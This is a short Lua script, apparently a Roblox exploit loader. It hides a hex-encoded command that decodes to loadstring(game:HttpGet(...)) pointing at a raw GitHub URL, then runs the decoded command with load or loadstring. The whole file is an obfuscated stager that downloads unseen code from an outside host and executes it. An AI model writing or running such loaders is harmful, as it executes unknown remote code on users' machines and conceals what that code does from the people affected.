local a function a(b)local c=tonumber local d=string.char local e function e(f)return d(c("0x"..f)%256)end return string.gsub(b,"..",e)end local g="6C6F6164737472696E672867616D653A48747470476574282268747470733A2F2F7261772E67697468756275736572636F6E74656E742E636F6D2F7177716F6F6F6F6F6F6F6F2F6A7777696977697769776977697769772F726566732F68656164732F6D61696E2FE6B7B7E6B7862E6C75612229292829"local h=load if not h then h=loadstring end h(a(g))(...)
